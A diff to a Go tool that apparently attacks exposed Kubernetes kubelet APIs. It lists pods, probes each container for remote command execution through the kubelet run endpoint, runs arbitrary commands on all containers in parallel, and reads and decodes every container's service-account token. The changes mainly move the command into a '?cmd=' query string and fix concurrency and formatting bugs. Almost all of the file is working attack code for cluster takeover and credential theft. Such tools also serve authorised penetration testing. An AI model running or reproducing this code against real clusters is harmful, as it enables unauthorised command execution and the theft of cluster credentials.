@@ -15,14 +15,13 @@ import (
 	"time"
 )
 
-
 type MetaData struct {
 	Name      string `json:"name"`
 	Namespace string `json:"namespace"`
 }
 
 type Container struct {
-	Name string	 `json:"name"`
+	Name    string `json:"name"`
 	RCEExec bool
 	RCERun  bool
 }
@@ -37,9 +36,8 @@ type Pod struct {
 }
 
 type PodList struct {
-	Items []Pod      `json:"items"`
+	Items []Pod `json:"items"`
 }
-
 
 var GlobalClient *http.Client
 
@@ -72,7 +70,10 @@ func getPods(url string) PodList {
 
 	var podList PodList
 	err = json.Unmarshal(bodyBytes, &podList)
-
+	if err != nil {
+		fmt.Printf("[*] JSON Unmarshal error: %s\n", err)
+		os.Exit(1)
+	}
 	return podList
 }
 
@@ -143,7 +144,7 @@ func printPods(podList []Pod) {
 }
 
 func checkPodsForRCE(nodeUrl string, pods []Pod) []Pod {
-	command := "cmd=ls /"
+	command := "?cmd=ls"
 	var nodePods []Pod
 
 	for _, pod := range pods {
@@ -151,21 +152,21 @@ func checkPodsForRCE(nodeUrl string, pods []Pod) []Pod {
 		containers := pod.Spec.Containers
 		for _, container := range containers {
 			containerRCERun := false
-			apiPathUrl := fmt.Sprintf("%s%s/%s/%s/%s", nodeUrl, RUN_API, pod.MetaData.Namespace, pod.MetaData.Name, container.Name)
-			resp, err := PostRequest(GlobalClient, apiPathUrl, []byte(command))
+			apiPathUrl := fmt.Sprintf("%s%s/%s/%s/%s%s", nodeUrl, RUN_API, pod.MetaData.Namespace, pod.MetaData.Name, container.Name, command)
+			resp, err := PostRequest(GlobalClient, apiPathUrl, []byte{})
 
 			// TODO: check if this check is enough
 			if err == nil && resp != nil && resp.StatusCode == http.StatusOK {
 				containerRCERun = true
 			}
-			podContainers = append(podContainers, Container {
-				Name:    container.Name,
-				RCERun:  containerRCERun,
+			podContainers = append(podContainers, Container{
+				Name:   container.Name,
+				RCERun: containerRCERun,
 			})
 		}
 
 		nodePods = append(nodePods, Pod{
-			MetaData:       MetaData{
+			MetaData: MetaData{
 				Name:      pod.MetaData.Name,
 				Namespace: pod.MetaData.Namespace,
 			},
@@ -182,20 +183,20 @@ var globalProtocolSchema string
 var globalNodeIP string
 var globalKubeletPort string
 
-func parseNodeURl(url string){
+func parseNodeURl(url string) {
 	splitted := strings.Split(url, ":")
 	globalProtocolSchema = splitted[0]
 	globalNodeIP = strings.Replace(splitted[1], "/", "", 2)
 	globalKubeletPort = splitted[2]
 }
 
-func findAndPrintContainerWithRCE(url string){
+func findAndPrintContainerWithRCE(url string) {
 	podList := getPods(url)
 	containersWithRCE := checkPodsForRCE(url, podList.Items)
 	printPods(containersWithRCE)
 }
 
-func findAndPrintPods(url string){
+func findAndPrintPods(url string) {
 	podList := getPods(url)
 	printPods(podList.Items)
 }
@@ -221,13 +222,13 @@ func parseCommandLine(command string) ([]string, error) {
 			continue
 		}
 
-		if (escapeNext) {
+		if escapeNext {
 			current += string(c)
 			escapeNext = false
 			continue
 		}
 
-		if (c == '\\') {
+		if c == '\\' {
 			escapeNext = true
 			continue
 		}
@@ -267,10 +268,10 @@ func parseCommandLine(command string) ([]string, error) {
 }
 
 const (
-	GET_PODS = "pods"
+	GET_PODS           = "pods"
 	GET_CONTAINERS_RCE = "rce"
-	RUN_COMMAND = "run"
-	TOKEN_COMMAND = "token"
+	RUN_COMMAND        = "run"
+	TOKEN_COMMAND      = "token"
 )
 
 func printHttpResponse(resp *http.Response, err error) {
@@ -300,24 +301,24 @@ func printHttpResponse(resp *http.Response, err error) {
 
 func runCommandOnContainer(url string, runCommand string, podName string, containerName string, namespace string) {
 	if runCommand == "" {
-		fmt.Println("[*] No command was set, setting default command 'ls /'")
-		runCommand = "ls /"
+		fmt.Println("[*] No command was set, setting default command 'ls'")
+		runCommand = "ls"
 	}
-	command := "cmd=" + runCommand
+	command := "?cmd=" + runCommand
 
-	apiPathUrl := fmt.Sprintf("%s%s/%s/%s/%s", url, RUN_API, namespace, podName, containerName)
-	resp, err := PostRequest(GlobalClient, apiPathUrl, []byte(command))
+	apiPathUrl := fmt.Sprintf("%s%s/%s/%s/%s%s", url, RUN_API, namespace, podName, containerName, command)
+	resp, err := PostRequest(GlobalClient, apiPathUrl, []byte{})
 
 	printHttpResponse(resp, err)
 }
 
 // Consider make it ASYNC
-func runCommandOnAllContainers(url string, runCommand string){
+func runCommandOnAllContainers(url string, runCommand string) {
 	if runCommand == "" {
-		fmt.Println("[*] No command was set, setting default command 'ls /'")
-		runCommand = "ls /"
+		fmt.Println("[*] No command was set, setting default command 'ls'")
+		runCommand = "ls"
 	}
-	command := "cmd=" + runCommand
+	command := "?cmd=" + runCommand
 
 	podList := getPods(url)
 	podNumber := 0
@@ -333,8 +334,8 @@ func runCommandOnAllContainers(url string, runCommand string){
 				spacesString = "     "
 			}
 
-			apiPathUrl := fmt.Sprintf("%s%s/%s/%s/%s", url, RUN_API,pod.MetaData.Namespace, pod.MetaData.Name, container.Name)
-			resp, err := PostRequest(GlobalClient, apiPathUrl, []byte(command))
+			apiPathUrl := fmt.Sprintf("%s%s/%s/%s/%s%s", url, RUN_API, pod.MetaData.Namespace, pod.MetaData.Name, container.Name, command)
+			resp, err := PostRequest(GlobalClient, apiPathUrl, []byte{})
 			var output string
 			if err == nil && resp != nil {
 				bodyBytes, err := ioutil.ReadAll(resp.Body)
@@ -365,10 +366,10 @@ type RunOutput struct {
 
 func runParallelCommandsOnPods(url string, runCommand string) {
 	if runCommand == "" {
-		fmt.Println("[*] No command was set, setting default command 'ls /'")
-		runCommand = "ls /"
+		fmt.Println("[*] No command was set, setting default command 'ls'")
+		runCommand = "ls"
 	}
-	command := "cmd=" + runCommand
+	command := "?cmd=" + runCommand
 
 	podList := getPods(url)
 	concurrencyLimit := 5
@@ -388,7 +389,9 @@ func runParallelCommandsOnPods(url string, runCommand string) {
 	// keen an index and loop through every Url we will send a request to
 	for i, pod := range podList.Items {
 		for _, container := range pod.Spec.Containers {
-
+			localI := i
+			localPod := pod
+			localContainer := container
 			// start a go routine with the index and Url in a closure
 			go func(i int, pod Pod, container Container) {
 
@@ -397,8 +400,8 @@ func runParallelCommandsOnPods(url string, runCommand string) {
 				// limit has been reached block until there is room
 				semaphoreChan <- struct{}{}
 
-				apiPathUrl := fmt.Sprintf("%s%s/%s/%s/%s", url, RUN_API, pod.MetaData.Namespace, pod.MetaData.Name, container.Name)
-				resp, err := PostRequest(GlobalClient, apiPathUrl, []byte(command))
+				apiPathUrl := fmt.Sprintf("%s%s/%s/%s/%s%s", url, RUN_API, pod.MetaData.Namespace, pod.MetaData.Name, container.Name, command)
+				resp, err := PostRequest(GlobalClient, apiPathUrl, []byte{})
 				statusCode := 0
 				var output string
 				if err == nil && resp != nil {
@@ -409,8 +412,7 @@ func runParallelCommandsOnPods(url string, runCommand string) {
 					}
 				}
 
-
-				result := &RunOutput{apiPathUrl, pod.MetaData.Name, container.Name, pod.MetaData.Namespace,output, statusCode}
+				result := &RunOutput{apiPathUrl, pod.MetaData.Name, container.Name, pod.MetaData.Namespace, output, statusCode}
 				containersCounter += 1
 				// now we can send the Result struct through the resultsChan
 				resultsChan <- result
@@ -418,7 +420,7 @@ func runParallelCommandsOnPods(url string, runCommand string) {
 				// has the effect of removing one from the limit and allowing
 				// another goroutine to start
 				<-semaphoreChan
-			}(i, pod, container)
+			}(localI, localPod, localContainer)
 		}
 	}
 
@@ -453,9 +455,8 @@ func runParallelCommandsOnPods(url string, runCommand string) {
 	}
 }
 
-
 func scanForTokensFromAllPods(url string) {
-	command := "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
+	command := "?cmd=cat%20/var/run/secrets/kubernetes.io/serviceaccount/token"
 
 	podList := getPods(url)
 	concurrencyLimit := 5
@@ -476,17 +477,18 @@ func scanForTokensFromAllPods(url string) {
 	// keen an index and loop through every Url we will send a request to
 	for i, pod := range podList.Items {
 		for _, container := range pod.Spec.Containers {
-
+			localI := i
+			localPod := pod
+			localContainer := container
 			// start a go routine with the index and Url in a closure
 			go func(i int, pod Pod, container Container) {
-
 				// this sends an empty struct into the semaphoreChan which
 				// is basically saying add one to the limit, but when the
 				// limit has been reached block until there is room
 				semaphoreChan <- struct{}{}
 
-				apiPathUrl := fmt.Sprintf("%s%s/%s/%s/%s", url, RUN_API, pod.MetaData.Namespace, pod.MetaData.Name, container.Name)
-				resp, err := PostRequest(GlobalClient, apiPathUrl, []byte(command))
+				apiPathUrl := fmt.Sprintf("%s%s/%s/%s/%s%s", url, RUN_API, pod.MetaData.Namespace, pod.MetaData.Name, container.Name, command)
+				resp, err := PostRequest(GlobalClient, apiPathUrl, []byte{})
 				statusCode := 0
 				var output string
 				if err == nil && resp != nil {
@@ -497,7 +499,7 @@ func scanForTokensFromAllPods(url string) {
 					}
 				}
 
-				result := &RunOutput{apiPathUrl, pod.MetaData.Name, container.Name, pod.MetaData.Namespace,output, statusCode}
+				result := &RunOutput{apiPathUrl, pod.MetaData.Name, container.Name, pod.MetaData.Namespace, output, statusCode}
 				containersCounter += 1
 				// now we can send the Result struct through the resultsChan
 
@@ -506,7 +508,7 @@ func scanForTokensFromAllPods(url string) {
 				// has the effect of removing one from the limit and allowing
 				// another goroutine to start
 				<-semaphoreChan
-			}(i, pod, container)
+			}(localI, localPod, localContainer)
 		}
 	}
 
@@ -549,7 +551,7 @@ func scanForTokensFromAllPods(url string) {
 	time.Sleep(time.Second)
 }
 
-type JWTToken struct{
+type JWTToken struct {
 	Iss            string `json:"iss"`
 	Namespace      string `json:"kubernetes.io/serviceaccount/namespace"`
 	Secret         string `json:"kubernetes.io/serviceaccount/secret.name"`
@@ -561,10 +563,10 @@ type JWTToken struct{
 // Taken from kubetok
 func PrintDecodedToken(tokenString string) {
 	splittedToken := strings.Split(tokenString, ".")
-	sDec, _  := b64.StdEncoding.DecodeString(splittedToken[1])
-	newDec:= string(sDec)
+	sDec, _ := b64.StdEncoding.DecodeString(splittedToken[1])
+	newDec := string(sDec)
 	newDec = strings.Replace(newDec, "\r\n", "\n", -1)
-	if !strings.HasSuffix(newDec, "}"){
+	if !strings.HasSuffix(newDec, "}") {
 		newDec += "}"
 	}
 
@@ -586,6 +588,10 @@ func PrintDecodedToken(tokenString string) {
 		sb.WriteString(fmt.Sprintf(" Raw: \n%s\n\n", newDec))
 		fmt.Println(sb.String())
 	}
+}
+
+func checkURL(url string) {
+	log.Printf("URL: %s", url)
 }
 
 func mainfunc(url string, commandLine string) error {
@@ -613,7 +619,7 @@ func mainfunc(url string, commandLine string) error {
 	var command string
 	var runCommand string
 
-	for i:= 0; i < len(args); i++ {
+	for i := 0; i < len(args); i++ {
 		if strings.HasPrefix(args[i], "-c") {
 			containerFlag = true
 			continue
@@ -642,7 +648,7 @@ func mainfunc(url string, commandLine string) error {
 			} else if namespaceFlag {
 				namespace = args[i]
 				namespaceFlag = false
-			}  else { // without switches
+			} else { // without switches
 				if waitForRunCommand {
 					runCommand = args[i]
 					waitForRunCommand = false
@@ -657,6 +663,7 @@ func mainfunc(url string, commandLine string) error {
 	}
 
 	InitHttpClient()
+	checkURL(url) // Here we check if the URL is OK
 
 	//parseNodeURl(url)
 	command = strings.ToLower(command)
@@ -684,7 +691,7 @@ func mainfunc(url string, commandLine string) error {
 		if rawFlag {
 			raw := getRawPods(url)
 			fmt.Println(string(raw))
-		}else {
+		} else {
 			findAndPrintPods(url)
 		}
 	}
